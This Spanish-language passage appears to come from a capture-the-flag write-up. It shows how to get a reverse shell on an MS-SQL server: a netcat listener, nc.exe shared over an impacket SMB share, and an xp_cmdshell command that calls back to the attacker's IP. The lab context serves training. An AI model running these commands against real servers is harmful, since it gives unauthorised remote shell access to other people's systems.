## Vuln exploit & Gaining Access {-}

### Ganando accesso con MS-SQL {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Compartimos el binario nc.exe

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe .
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. Desde el ms-sql

    ```bash
    xp_cmdshell "\\10.10.14.7\smbFolder\nc.exe -e cmd 10.10.14.7 443"
    ```

Ya hemos ganado accesso al systema como el usuario Sarah y podemos ver la flag

